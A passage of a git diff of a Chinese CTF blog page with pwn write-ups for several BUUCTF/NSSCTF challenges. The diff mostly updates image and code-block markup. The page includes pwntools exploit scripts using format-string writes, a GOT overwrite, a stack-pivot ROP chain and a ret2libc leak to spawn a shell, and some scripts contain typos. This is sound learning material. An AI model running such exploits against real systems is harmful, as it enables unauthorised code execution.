 <h2 id="第五空间2019-决赛-PWN5"><a href="#第五空间2019-决赛-PWN5" class="headerlink" title="[第五空间2019 决赛]PWN5"></a>[第五空间2019 决赛]PWN5</h2><p>checksec一下 32位 有NX保护（栈不可执行），canary保护（会放入一个值，在返回的时候会进行检查，得保证这个值没变）</p>
-<p><img src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/02.png"></p>
+<p><img lazyload src="/images/loading.svg" data-src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/02.png"></p>
 <p>偏移量的计算 10 &#x3D;&gt; 我们输入的数据是从第十个开始的</p>
-<p><img src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/03.png"></p>
+<p><img lazyload src="/images/loading.svg" data-src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/03.png"></p>
 <p>A的ascii值是65 &#x3D;&gt; 对应十六进制的0x41             a的ascii值是97 &#x3D;&gt; 对应十六进制的0x61</p>
 <p>程序要求我们输入的值与随机数相等，才可以执行<code>system(&#39;bin/sh&#39;)</code></p>
 <p>&#x3D;&gt; 由于存在格式化字符串漏洞</p>
 <p>我们可以通过<code>%n</code> 来修改储存随机数的地址的值</p>
-<p><img src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/04.png"></p>
+<p><img lazyload src="/images/loading.svg" data-src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/04.png"></p>
 <p>随机数起始地址是在 0x804c044 由于随机数是四位 </p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">26680</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">payload = p32(<span class="number">0x804c044</span>) + p32(<span class="number">0x804c045</span>) + p32(<span class="number">0x804c046</span>) + p32(<span class="number">0x804c047</span>)</span><br><span class="line">payload += <span class="string">&#x27;%10$n%11$n%12$n%13$n&#x27;</span></span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.sendline(<span class="built_in">str</span>(<span class="number">0x10101010</span>))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">26680</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">payload = p32(<span class="number">0x804c044</span>) + p32(<span class="number">0x804c045</span>) + p32(<span class="number">0x804c046</span>) + p32(<span class="number">0x804c047</span>)</span><br><span class="line">payload += <span class="string">&#x27;%10$n%11$n%12$n%13$n&#x27;</span></span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.sendline(<span class="built_in">str</span>(<span class="number">0x10101010</span>))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div>
 
 
 
 <p>给Bss赋值，使得NX不可执行变为可执行 &#x3D;&gt; 构建shellcode</p>
-<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">int mprotect(const void <span class="emphasis">*start, size_t len, int prot);</span></span><br><span class="line"><span class="emphasis">	第一个参数填的是一个地址，是指需要进行操作的地址。</span></span><br><span class="line"><span class="emphasis">	第二个参数是地址往后多大的长度。</span></span><br><span class="line"><span class="emphasis">	第三个参数的是要赋予的权限。</span></span><br><span class="line"><span class="emphasis">mprotect()函数把自start开始的、长度为len的内存区的保护属性修改为prot指定的值。</span></span><br><span class="line"><span class="emphasis">prot可以取以下几个值，并且可以用“|”将几个属性合起来使用：</span></span><br><span class="line"><span class="emphasis">　　1）PROT_READ：表示内存段内的内容可写；</span></span><br><span class="line"><span class="emphasis">　　2）PROT_WRITE：表示内存段内的内容可读；</span></span><br><span class="line"><span class="emphasis">　　3）PROT_EXEC：表示内存段中的内容可执行；</span></span><br><span class="line"><span class="emphasis">　　4）PROT_NONE：表示内存段中的内容根本没法访问。</span></span><br><span class="line"><span class="emphasis">prot=7表示可读可写可执行，将它类比于chmod中的7</span></span><br></pre></td></tr></table></figure>
+<div class="highlight-container" data-rel="Markdown"><figure class="iseeu highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">int mprotect(const void <span class="emphasis">*start, size_t len, int prot);</span></span><br><span class="line"><span class="emphasis">	第一个参数填的是一个地址，是指需要进行操作的地址。</span></span><br><span class="line"><span class="emphasis">	第二个参数是地址往后多大的长度。</span></span><br><span class="line"><span class="emphasis">	第三个参数的是要赋予的权限。</span></span><br><span class="line"><span class="emphasis">mprotect()函数把自start开始的、长度为len的内存区的保护属性修改为prot指定的值。</span></span><br><span class="line"><span class="emphasis">prot可以取以下几个值，并且可以用“|”将几个属性合起来使用：</span></span><br><span class="line"><span class="emphasis">　　1）PROT_READ：表示内存段内的内容可写；</span></span><br><span class="line"><span class="emphasis">　　2）PROT_WRITE：表示内存段内的内容可读；</span></span><br><span class="line"><span class="emphasis">　　3）PROT_EXEC：表示内存段中的内容可执行；</span></span><br><span class="line"><span class="emphasis">　　4）PROT_NONE：表示内存段中的内容根本没法访问。</span></span><br><span class="line"><span class="emphasis">prot=7表示可读可写可执行，将它类比于chmod中的7</span></span><br></pre></td></tr></table></figure></div>
 
 
 
-<h2 id="HDCTF-2023-KEEP-ON"><a href="#HDCTF-2023-KEEP-ON" class="headerlink" title="[HDCTF 2023]KEEP ON"></a>[HDCTF 2023]KEEP ON</h2><h3 id="知识点：格式化字符串劫持、栈迁移"><a href="#知识点：格式化字符串劫持、栈迁移" class="headerlink" title="知识点：格式化字符串劫持、栈迁移"></a><strong>知识点：格式化字符串劫持、<a target="_blank" rel="noopener" href="https://www.cnblogs.com/max1z/p/15299000.html">栈迁移</a></strong></h3><p><img src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/10.png"></p>
-<h3 id="法1-格式化字符串劫持-将printf-got-改成-system-plt"><a href="#法1-格式化字符串劫持-将printf-got-改成-system-plt" class="headerlink" title="法1,格式化字符串劫持(将printf_got 改成 system_plt)"></a><strong>法1,格式化字符串劫持(将printf_got 改成 system_plt)</strong></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#   -&gt; 通过调用printf函数来调用system函数的地址，而这个程序中我们写入的内容保存在s中 然后会作为printf的参数，从而得到shell</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&quot;debug&quot;</span>,arch=<span class="string">&quot;amd64&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># context(log_level=&quot;debug&quot;,arch=&quot;i386&quot;)</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;node4.anna.nssctf.cn&quot;</span>,<span class="number">28014</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&quot;./../pwn&quot;)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./hdctf&quot;</span>)</span><br><span class="line"></span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]  <span class="comment"># 寻找got表中printf的地址</span></span><br><span class="line"></span><br><span class="line">system_glt = elf.glt[<span class="string">&#x27;system&#x27;</span>]  <span class="comment"># 寻找plt表中system的地址</span></span><br><span class="line"></span><br><span class="line">payload1 = fmtstr_payload(<span class="number">6</span>, &#123;printf_got:system_plt&#125;)  <span class="comment"># fmtstr_payload:got表劫持函数, 6是对应格式化字符串位置的索引，后面将printf的地址改成system的</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;name: \n&#x27;</span>)   <span class="comment"># \n 是换行的意思.</span></span><br><span class="line"></span><br><span class="line">p.send(payload1)	<span class="comment"># 这里发送是为了将printf_got 改成 system_plt =&gt; 以后调用printf函数就相当于调用system</span></span><br><span class="line"></span><br><span class="line">vulnaddr = elf.sym[<span class="string">&#x27;vuln&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload2 = cyclic(<span class="number">0x50</span> + <span class="number">0x08</span>) + p64(vuln_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;keep on !\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload2)   <span class="comment"># 这里必须用send --&gt; 因为这里的read写入0x60(溢出16字节)0x08和vuln的地址就是16字节了,sendline后面跟有换行符</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;name: \n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="HDCTF-2023-KEEP-ON"><a href="#HDCTF-2023-KEEP-ON" class="headerlink" title="[HDCTF 2023]KEEP ON"></a>[HDCTF 2023]KEEP ON</h2><h3 id="知识点：格式化字符串劫持、栈迁移"><a href="#知识点：格式化字符串劫持、栈迁移" class="headerlink" title="知识点：格式化字符串劫持、栈迁移"></a><strong>知识点：格式化字符串劫持、<a class="link" target="_blank" rel="noopener" href="https://www.cnblogs.com/max1z/p/15299000.html">栈迁移 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></strong></h3><p><img lazyload src="/images/loading.svg" data-src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/10.png"></p>
+<h3 id="法1-格式化字符串劫持-将printf-got-改成-system-plt"><a href="#法1-格式化字符串劫持-将printf-got-改成-system-plt" class="headerlink" title="法1,格式化字符串劫持(将printf_got 改成 system_plt)"></a><strong>法1,格式化字符串劫持(将printf_got 改成 system_plt)</strong></h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#   -&gt; 通过调用printf函数来调用system函数的地址，而这个程序中我们写入的内容保存在s中 然后会作为printf的参数，从而得到shell</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&quot;debug&quot;</span>,arch=<span class="string">&quot;amd64&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># context(log_level=&quot;debug&quot;,arch=&quot;i386&quot;)</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;node4.anna.nssctf.cn&quot;</span>,<span class="number">28014</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&quot;./../pwn&quot;)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./hdctf&quot;</span>)</span><br><span class="line"></span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]  <span class="comment"># 寻找got表中printf的地址</span></span><br><span class="line"></span><br><span class="line">system_glt = elf.glt[<span class="string">&#x27;system&#x27;</span>]  <span class="comment"># 寻找plt表中system的地址</span></span><br><span class="line"></span><br><span class="line">payload1 = fmtstr_payload(<span class="number">6</span>, &#123;printf_got:system_plt&#125;)  <span class="comment"># fmtstr_payload:got表劫持函数, 6是对应格式化字符串位置的索引，后面将printf的地址改成system的</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;name: \n&#x27;</span>)   <span class="comment"># \n 是换行的意思.</span></span><br><span class="line"></span><br><span class="line">p.send(payload1)	<span class="comment"># 这里发送是为了将printf_got 改成 system_plt =&gt; 以后调用printf函数就相当于调用system</span></span><br><span class="line"></span><br><span class="line">vulnaddr = elf.sym[<span class="string">&#x27;vuln&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload2 = cyclic(<span class="number">0x50</span> + <span class="number">0x08</span>) + p64(vuln_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;keep on !\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload2)   <span class="comment"># 这里必须用send --&gt; 因为这里的read写入0x60(溢出16字节)0x08和vuln的地址就是16字节了,sendline后面跟有换行符</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;name: \n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
 
 <blockquote>
 <p>寻找偏移量 找 616161在第几位 </p>
 <p>​	-&gt; 我们输入的是aaaa 0x61(十六进制 -&gt; ascii的97)即a</p>
 </blockquote>
-<p><img src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/11.png"></p>
-<h3 id="法2-栈迁移-可以先阅读前面的那个文章"><a href="#法2-栈迁移-可以先阅读前面的那个文章" class="headerlink" title="法2,栈迁移,可以先阅读前面的那个文章"></a>法2,栈迁移,可以先阅读前面的那个文章</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ROPgadget --binary hdctf --only &quot;pop|ret&quot;  0x00000000004008d3 : pop rdi ; ret</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ROPgadget --binary hdctf | grep leave   0x00000000004007f2 : leave ; ret</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;node4.anna.nssctf.cn&quot;</span>,<span class="number">28296</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./hdctf&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;name: \n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">b&#x27;%16$p&#x27;</span>)  <span class="comment"># 获得 old_rbp</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;hello,0x&#x27;</span>)</span><br><span class="line"></span><br><span class="line">old_rbp = <span class="built_in">int</span>(io.recvunitl(<span class="string">&#x27;\n&#x27;</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">target_addr = old_rbp - <span class="number">0x60</span> - <span class="number">0x08</span></span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x4008d3</span></span><br><span class="line"></span><br><span class="line">leave_ret = <span class="number">0x4007f2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = p64(pop_rdi_ret) + p64(target_addr + <span class="number">0x20</span>) + p64(elf.sym[<span class="string">&#x27;system&#x27;</span>]) + <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">0x50</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(target_addr) + p64(leave_ret)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;keep on !&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<p><img lazyload src="/images/loading.svg" data-src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/11.png"></p>
+<h3 id="法2-栈迁移-可以先阅读前面的那个文章"><a href="#法2-栈迁移-可以先阅读前面的那个文章" class="headerlink" title="法2,栈迁移,可以先阅读前面的那个文章"></a>法2,栈迁移,可以先阅读前面的那个文章</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ROPgadget --binary hdctf --only &quot;pop|ret&quot;  0x00000000004008d3 : pop rdi ; ret</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ROPgadget --binary hdctf | grep leave   0x00000000004007f2 : leave ; ret</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;node4.anna.nssctf.cn&quot;</span>,<span class="number">28296</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./hdctf&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;name: \n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">b&#x27;%16$p&#x27;</span>)  <span class="comment"># 获得 old_rbp</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;hello,0x&#x27;</span>)</span><br><span class="line"></span><br><span class="line">old_rbp = <span class="built_in">int</span>(io.recvunitl(<span class="string">&#x27;\n&#x27;</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">target_addr = old_rbp - <span class="number">0x60</span> - <span class="number">0x08</span></span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x4008d3</span></span><br><span class="line"></span><br><span class="line">leave_ret = <span class="number">0x4007f2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = p64(pop_rdi_ret) + p64(target_addr + <span class="number">0x20</span>) + p64(elf.sym[<span class="string">&#x27;system&#x27;</span>]) + <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">0x50</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(target_addr) + p64(leave_ret)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;keep on !&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>
 
 <p>Q&amp;A（个人理解）</p>
 <p><code>%16$p是哪来的</code></p>
 <p>-&gt;可以用过gdb动态调试得到old_rbp的具体值,然后通过尽量多的%p来泄露出具体位置</p>
-<p><img src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/12.png"></p>
+<p><img lazyload src="/images/loading.svg" data-src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/12.png"></p>
 <p><code>0x60是哪里来的?</code></p>
 <p>-&gt;子函数中栈底指向了父函数的栈底的地址, 0x7fffffffe1e0就是old_rbp - 0x7fffffffe180&#x3D;0x60</p>
-<p><img src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/13.png"></p>
+<p><img lazyload src="/images/loading.svg" data-src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/13.png"></p>
 <p><code>payload中为什么要加0x20 ?</code></p>
 <p>-&gt; 0x20 &#x3D; 32 &#x3D;&gt; 4个8字节, 指向了&#x2F;bin&#x2F;sh所在的位置</p>
-<p><img src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/14.png"></p>
+<p><img lazyload src="/images/loading.svg" data-src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/14.png"></p>
 <h2 id="BUU-HNCTF-2022-Week1-fmtstrre"><a href="#BUU-HNCTF-2022-Week1-fmtstrre" class="headerlink" title="BUU-[HNCTF 2022 Week1]fmtstrre"></a>BUU-[HNCTF 2022 Week1]fmtstrre</h2><p>先checksec一下</p>
-<p><img src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/06.png"></p>
+<p><img lazyload src="/images/loading.svg" data-src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/06.png"></p>
 <p>然后IDA(64)打开</p>
-<p><img src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/09.png"></p>
+<p><img lazyload src="/images/loading.svg" data-src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/09.png"></p>
 <blockquote>
 <p>open函数(成功打开文件返回非负整数，打开失败返回-1)</p>
 <p>read(fd, &amp;name, 48uLL)函数(向fd中读取48字节数据存放至name地址下)</p>
@@ -416,19 +668,19 @@
 <p>-&gt;当然,这个文件不是必须的.</p>
 <p><code>该如何利用这个漏洞？</code>根据这个题，flag这个文件的内容是存放在了栈中，那我们就要知道具体的位置。</p>
 <p>-&gt;偏移量的计算（看别人的Wp说是偏移了38）即flag 的内容是保存在第38个的位置上的</p>
-<p><strong>参考<a target="_blank" rel="noopener" href="https://www.cnblogs.com/falling-dusk/p/17858030.html">https://www.cnblogs.com/falling-dusk/p/17858030.html</a></strong></p>
-<p><img src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/07.png"></p>
+<p><strong>参考<a class="link" target="_blank" rel="noopener" href="https://www.cnblogs.com/falling-dusk/p/17858030.html">https://www.cnblogs.com/falling-dusk/p/17858030.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></strong></p>
+<p><img lazyload src="/images/loading.svg" data-src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/07.png"></p>
 <blockquote>
 <p>找 …4141… 类似的数据，看它是第几个地址（6）</p>
 </blockquote>
-<p><img src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/08.png"></p>
+<p><img lazyload src="/images/loading.svg" data-src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/08.png"></p>
 <blockquote>
 <p>name即flag的位置，0x20 &#x3D;32 &#x3D;&gt;偏移量.</p>
 <p>rsp到name的距离是 0x1d0 - 0x0d0 &#x3D; 256 &#x2F; 8 &#x3D;32</p>
 <p>​	对于这里要除以8 —&gt; 我理解的是（64位程序，栈中一个小格格是8字节数据，一共相差256字节，即32个小格子）</p>
 </blockquote>
 <p>32 + 6 &#x3D;38</p>
-<h3 id="exp"><a href="#exp" class="headerlink" title="exp:"></a><strong>exp:</strong></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote()</span><br><span class="line">payload = <span class="string">&quot;%38$s&quot;</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp:"></a><strong>exp:</strong></h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote()</span><br><span class="line">payload = <span class="string">&quot;%38$s&quot;</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>
 
 
 
@@ -445,147 +697,464 @@
 <p>-&gt;如果前v1个字符都相同，返回0 ； 如果不同，则返回第一个不匹配的字符的ASCII码差值</p>
 <p><strong>找不到system和binsh，很明显要通过构造Rop寻找libc</strong></p>
 <p>题目提供了libc文件</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">27244</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;\xff&#x27;</span>*<span class="number">7</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Correct\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr = <span class="number">0x08048825</span></span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0xe7</span> + <span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span> + p32(write_plt) + p32(main_addr) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">4</span>)</span><br><span class="line">r.sendline(payload1)</span><br><span class="line">write_addr = u32(r.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(write_addr))</span><br><span class="line"></span><br><span class="line">offest = write_addr - libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">system_addr = offest + libc.sym[<span 